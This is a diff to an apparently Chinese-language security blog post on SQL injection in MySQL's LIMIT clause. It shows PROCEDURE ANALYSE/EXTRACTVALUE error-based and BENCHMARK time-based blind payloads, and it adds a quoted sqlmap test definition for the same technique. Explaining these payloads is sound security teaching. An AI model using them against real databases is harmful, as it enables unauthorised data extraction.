@@ -5,6 +5,7 @@ date:   2018-01-25 21:41:45 +0800
 categories: [SQL注入, limit注入]
 ---
 > 这个limit注入为何拿出来提呢？定有它的特别之处
+
 # 0X00 官方文档中的 limit
 ```sql
 SELECT
@@ -79,7 +80,32 @@ select * from users order by id limit 1 procedure analyse(extractvalue(rand(),co
 SELECT field FROM table WHERE id > 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)
 ```
 
-# 0X03 参考
+# 0X03 sqlmap 表现情况
+
+```shell
+    <test>
+        <title>MySQL &gt;= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>2</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1</where>
+        <vector>PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\',(IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])))),1)</vector>
+        <request>
+            <payload>PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\',(BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))))),1)</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
+        </details>
+    </test>
+```
+从这段payload中可以发现，sqlmap是拥有这种场景下的检测能力的，并且判断的mysql版本和wooyunZone中所讨论的一致
+
+# 0X04 参考
 
 1、[Testing for MySQL](https://www.owasp.org/index.php/Testing_for_MySQL)
 
